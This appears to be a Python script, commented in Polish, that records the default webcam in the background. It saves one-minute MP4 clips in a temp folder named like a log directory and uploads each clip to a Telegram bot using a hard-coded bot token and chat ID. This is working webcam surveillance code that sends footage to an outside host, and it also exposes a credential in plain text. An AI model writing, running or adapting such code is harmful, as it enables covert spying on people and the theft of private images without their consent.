import os
import tempfile
import time
import cv2
import requests
import json

# ===== KONFIGURACJA TELEGRAM =====
BOT_TOKEN = "8853348229:AAHtWaSI0jZ2tEXDWkYIqSa6ujIk7voQm0E"  # Wpisz swój token od @BotFather
CHAT_ID = "7701250279"      # Wpisz swoje ID (np. od @getidsbot)

def utworz_folder_logow():
    """
    Tworzy folder temp/logi/kamera, jeśli nie istnieje.
    """
    temp_dir = tempfile.gettempdir()
    folder_path = os.path.join(temp_dir, 'logi', 'kamera')
    
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Utworzono folder: {folder_path}")
    else:
        print(f"Folder już istnieje: {folder_path}")
    
    return folder_path

def wyslij_do_telegramu(sciezka_pliku):
    """
    Wysyła plik do bota na Telegramie.
    """
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        with open(sciezka_pliku, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID}
            
            response = requests.post(url, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                print(f"✅ Plik wysłany do Telegram: {os.path.basename(sciezka_pliku)}")
            else:
                print(f"❌ Błąd wysyłki: {response.status_code} - {response.text}")
                
    except Exception as e:
        print(f"❌ Błąd podczas wysyłania do Telegram: {e}")

def main():
    # Inicjalizacja domyślnej kamerki systemowej
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print(
            "BŁĄD: Nie można otworzyć kamerki. Sprawdź, czy nie jest używana przez inną aplikację."
        )
        return

    # Stałe ustawienia wideo dla pracy w tle
    fps = 20.0
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    if width == 0 or height == 0:
        width, height = 640, 480

    fourcc = cv2.VideoWriter_fourcc(*"mp4v")

    # Tworzymy folder logów w temp
    folder_zapisu = utworz_folder_logow()
    
    print(f"--- REJESTRATOR URUCHOMIONY W TLE ---")
    print(f"Folder zapisu: {folder_zapisu}")
    print(f"Telegram: wysyłanie plików po każdej minucie")
    print("Naciśnij Ctrl + C w tym terminalu, aby bezpiecznie przerwać nagrywanie.")

    frames_per_minute = int(fps * 60)
    frame_counter = 0

    def start_new_video():
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"nagranie_{timestamp}.mp4"
        filepath = os.path.join(folder_zapisu, filename)

        video_writer = cv2.VideoWriter(filepath, fourcc, fps, (width, height))

        if not video_writer.isOpened():
            print(f"BŁĄD: Nie można utworzyć pliku: {filename}")
            return None, None
        else:
            print(f"[{time.strftime('%H:%M:%S')}] Rozpoczęto zapis pliku: {filename}")
            return video_writer, filepath

    # Inicjalizacja pierwszego pliku
    out, aktualny_plik = start_new_video()

    try:
        while True:
            ret, frame = cap.read()

            if not ret:
                print("Nie można pobrać klatki z kamery. Próba ponowna...")
                time.sleep(0.1)
                continue

            if out and out.isOpened():
                out.write(frame)

            frame_counter += 1

            # Sprawdzenie, czy minęła minuta
            if frame_counter >= frames_per_minute:
                if out:
                    out.release()
                    
                    # WYŚLIJ PLIK DO TELEGRAM
                    if aktualny_plik:
                        wyslij_do_telegramu(aktualny_plik)
                
                # Rozpocznij nowy plik
                out, aktualny_plik = start_new_video()
                frame_counter = 0

            time.sleep(1 / fps)

    except KeyboardInterrupt:
        print("\nPrzechwycono żądanie zamknięcia (Ctrl+C).")

    finally:
        print("Zapisywanie ostatniego pliku i zwalnianie zasobów...")
        cap.release()
        
        if out:
            out.release()
            # Wyślij ostatni plik do Telegram
            if aktualny_plik:
                wyslij_do_telegramu(aktualny_plik)
        
        cv2.destroyAllWindows()
        print("Program został bezpiecznie wyłączony.")

if __name__ == "__main__":
    main()